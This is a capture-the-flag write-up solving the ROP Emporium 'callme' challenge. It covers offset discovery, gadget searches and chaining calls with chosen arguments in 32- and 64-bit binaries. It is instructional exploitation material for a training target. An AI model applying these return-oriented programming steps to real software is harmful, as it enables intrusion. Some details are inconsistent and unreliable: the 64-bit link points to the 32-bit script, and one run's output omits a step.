### Binary Exploitation

### Source: ROP Emporium

### Name: Callme (x86 & x64)

#### Description: You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

### Basic File Checks

```
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/callme/32bits]
└─$ file callme32 
callme32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ca5cba17bcd8926f0cda98986ef619c55023b6d, not stripped
                                                                                                                                                          
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/callme/32bits]
└─$ checksec --file=callme32 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   75 Symbols        No    0               3               callme32
                                                                                                                                                         
```

We’re working with a x86 binary and the protections enabled is just NX

I’ll run the binary to get an overview of what it does


```
└─$ ./callme 
callme by ROP Emporium
x86

Hope you read the instructions...

> lol
Thank you!

Exiting
```

So it prints out some words then asks for input then exits after we give it input

Decompiling using ghidra i’ll read the main function

```

undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("callme by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

So the main function calls the pwnme() function

Here’s the decompiled pwnme function

```

void pwnme(void)

{
  undefined input [32];
  
  memset(input,0,0x20);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,input,0x200);
  puts("Thank you!");
  return;
}
```

So reading the code we get the vulnerability that is in it, it reads 0x200 bytes of data into a 32 bytes input buffer

With this we have extra bytes which will cause an overflow

Looking through the code i get another function called usefulFunction

```

void usefulFunction(void)

{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

So it calls the `callme_*` function 

Now from the description we know that out goal is to 

```
1. Overwrite the return address to call the callme functions
2. Pass in the valid arguments when the function is called
```

Time to get the offset

I’ll get the offset the way i did it in [Ret2Win](https://markuched13.github.io/posts/bof/ret2win.html)

```
└─$ gdb -q callme32 
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from callme32...
(No debugging symbols found in callme32)
gef➤  disass pwnme
Dump of assembler code for function pwnme:
   0x080486ed <+0>:     push   ebp
   0x080486ee <+1>:     mov    ebp,esp
   0x080486f0 <+3>:     sub    esp,0x28
   0x080486f3 <+6>:     sub    esp,0x4
   0x080486f6 <+9>:     push   0x20
   0x080486f8 <+11>:    push   0x0
   0x080486fa <+13>:    lea    eax,[ebp-0x28]
   0x080486fd <+16>:    push   eax
   0x080486fe <+17>:    call   0x8048540 <memset@plt>
   0x08048703 <+22>:    add    esp,0x10
   0x08048706 <+25>:    sub    esp,0xc
   0x08048709 <+28>:    push   0x8048848
   0x0804870e <+33>:    call   0x8048500 <puts@plt>
   0x08048713 <+38>:    add    esp,0x10
   0x08048716 <+41>:    sub    esp,0xc
   0x08048719 <+44>:    push   0x804886b
   0x0804871e <+49>:    call   0x80484d0 <printf@plt>
   0x08048723 <+54>:    add    esp,0x10
   0x08048726 <+57>:    sub    esp,0x4
   0x08048729 <+60>:    push   0x200
   0x0804872e <+65>:    lea    eax,[ebp-0x28]
   0x08048731 <+68>:    push   eax
   0x08048732 <+69>:    push   0x0
   0x08048734 <+71>:    call   0x80484c0 <read@plt>
   0x08048739 <+76>:    add    esp,0x10
   0x0804873c <+79>:    sub    esp,0xc
   0x0804873f <+82>:    push   0x804886e
   0x08048744 <+87>:    call   0x8048500 <puts@plt>
   0x08048749 <+92>:    add    esp,0x10
   0x0804874c <+95>:    nop
   0x0804874d <+96>:    leave  
   0x0804874e <+97>:    ret    
End of assembler dump.
gef➤  b *pwnme+96
Breakpoint 1 at 0x804874d
gef➤  r
Starting program: /home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/32bits/callme32 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
callme by ROP Emporium
x86

Hope you read the instructions...

> pwnerhacker
Thank you!

Breakpoint 1, 0x0804874d in pwnme ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xf7e1e9b8  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffcff0  →  "pwnerhacker\n"
$ebp   : 0xffffd018  →  0xffffd028  →  0x00000000
$esi   : 0x80487a0  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x804874d  →  <pwnme+96> leave 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcff0│+0x0000: "pwnerhacker\n"      ← $esp
0xffffcff4│+0x0004: "rhacker\n"
0xffffcff8│+0x0008: "ker\n"
0xffffcffc│+0x000c: 0x00000000
0xffffd000│+0x0010: 0x00000000
0xffffd004│+0x0014: 0x00000000
0xffffd008│+0x0018: 0x00000000
0xffffd00c│+0x001c: 0x00000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048744 <pwnme+87>       call   0x8048500 <puts@plt>
    0x8048749 <pwnme+92>       add    esp, 0x10
    0x804874c <pwnme+95>       nop    
 →  0x804874d <pwnme+96>       leave  
    0x804874e <pwnme+97>       ret    
    0x804874f <usefulFunction+0> push   ebp
    0x8048750 <usefulFunction+1> mov    ebp, esp
    0x8048752 <usefulFunction+3> sub    esp, 0x8
    0x8048755 <usefulFunction+6> sub    esp, 0x4
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "callme32", stopped 0x804874d in pwnme (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804874d → pwnme()
[#1] 0x80486d0 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcff0 - 0xffffcffd  →   "pwnerhacker\n" 
gef➤  i f
Stack level 0, frame at 0xffffd020:
 eip = 0x804874d in pwnme; saved eip = 0x80486d0
 called by frame at 0xffffd040
 Arglist at 0xffffd018, args: 
 Locals at 0xffffd018, Previous frame's sp is 0xffffd020
 Saved registers:
  ebp at 0xffffd018, eip at 0xffffd01c
gef➤ 
```

So doing the math we get the offset `0xffffd01c - 0xffffcff0 = 0x2c` 

Cool with that here's what i'll do 

Since we have 3 functions which requires 3 arguments i can't just pass them to the stack cause it will overwrite some values of the stack

Here's the way argument are passed onto the stack 

```
x86 elf architecture, arguments are passed onto the stack

x86 elf architecture, arguments are passed onto the stack

+-----------------+---------------+---------------+------------+
| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |
+-----------------+---------------+---------------+------------+
|   rbp           |     ebp       |     bp        |     bpl    |
|   rsp           |     esp       |     sp        |     spl    |
|   rip           |     eip       |               |            |
|   rax           |     eax       |     ax        |     al     |
|   rbx           |     ebx       |     bx        |     bl     |
|   rcx           |     ecx       |     cx        |     cl     |
|   rdx           |     edx       |     dx        |     dl     |
|   rsi           |     esi       |     si        |     sil    |
|   rdi           |     edi       |     di        |     dil    |
|   r8            |     r8d       |     r8w       |     r8b    |
|   r9            |     r9d       |     r9w       |     r9b    |
|   r10           |     r10d      |     r10w      |     r10b   |
|   r11           |     r11d      |     r11w      |     r11b   |
|   r12           |     r12d      |     r12w      |     r12b   |
|   r13           |     r13d      |     r13w      |     r13b   |
|   r14           |     r14d      |     r14w      |     r14b   |
|   r15           |     r15d      |     r15w      |     r15b   |
+-----------------+---------------+---------------+------------+

```


So basically since we're passing in 3 arguments, the registers needed should pop 3 values off the stack

I can get that with ropper 

```
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/callme/32bits]
└─$ ropper --file callme32 --search "pop"    
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme32
0x080487fb: pop ebp; ret; 
0x080487f8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x080484ad: pop ebx; ret; 
0x080487fa: pop edi; pop ebp; ret; 
0x080487f9: pop esi; pop edi; pop ebp; ret; 
0x08048810: pop ss; add byte ptr [eax], al; add esp, 8; pop ebx; ret; 
0x080486ea: popal; cld; ret; 
```

Seems `0x080487f9: pop esi; pop edi; pop ebp; ret; ` will work 

I'll get the corresponding callme addresses using gdb

```
└─$ gdb -q callme32
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from callme32...
(No debugging symbols found in callme32)
gef➤  disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804874f <+0>:     push   ebp
   0x08048750 <+1>:     mov    ebp,esp
   0x08048752 <+3>:     sub    esp,0x8
   0x08048755 <+6>:     sub    esp,0x4
   0x08048758 <+9>:     push   0x6
   0x0804875a <+11>:    push   0x5
   0x0804875c <+13>:    push   0x4
   0x0804875e <+15>:    call   0x80484e0 <callme_three@plt>
   0x08048763 <+20>:    add    esp,0x10
   0x08048766 <+23>:    sub    esp,0x4
   0x08048769 <+26>:    push   0x6
   0x0804876b <+28>:    push   0x5
   0x0804876d <+30>:    push   0x4
   0x0804876f <+32>:    call   0x8048550 <callme_two@plt>
   0x08048774 <+37>:    add    esp,0x10
   0x08048777 <+40>:    sub    esp,0x4
   0x0804877a <+43>:    push   0x6
   0x0804877c <+45>:    push   0x5
   0x0804877e <+47>:    push   0x4
   0x08048780 <+49>:    call   0x80484f0 <callme_one@plt>
   0x08048785 <+54>:    add    esp,0x10
   0x08048788 <+57>:    sub    esp,0xc
   0x0804878b <+60>:    push   0x1
   0x0804878d <+62>:    call   0x8048510 <exit@plt>
End of assembler dump.
gef➤ 
```

Here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/exploit32.py)

On running it

```
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/callme/32bits]
└─$ python exploit.py
[+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/32bits/callme32': pid 203683
[*] Switching to interactive mode
[*] Process 'callme32' stopped with exit code 0 (pid 203683)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

Here's the autopwn script using ROP [Script]([Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/autopwn32.py))

It automates the stress 😭😭 but its cool 🙂

On running it we get the flag

```
┌──(mark㉿haxor)-[~/…/Challs/RopEmperium/callme/32bits]
└─$ python3 autopwn.py 
[+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/32bits/callme32': pid 208792
[*] Loaded 10 cached gadgets for './callme32'
[+] callme_one() called correctly
[+] callme_two() called correctly
[+] ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/32bits/callme32' stopped with exit code 0 (pid 208792)
```

So for the x64 binary the approach is similar but this time we need to pass in the argument in the correct register 

```
└─$ ropper --file callme --search "pop rdi" 
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
0x00000000004009a3: pop rdi; ret; 
```

The first one will work fine

Here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/exploit32.py)

On running it

```
└─$ python exploit.py 
[+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/64bits/callme': pid 217944
[+] callme_one() called correctly
[+] callme_two() called correctly
[+] ROPE{a_placeholder_64byte_flag!}
[*] Process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/64bits/callme' stopped with exit code 0 (pid 217944)
```

it worked. Here's the autopwn script [Autopwn](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/callme/autopwn64.py)

Running it works also 

```
└─$ python autopwn.py
[+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/callme/64bits/callme': pid 220794
[*] Loaded 17 cached gadgets for './callme'
[+] callme_one() called correctly
[*] callme_two() called correctly
[*] ROPE{a_placeholder_64byte_flag!}
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
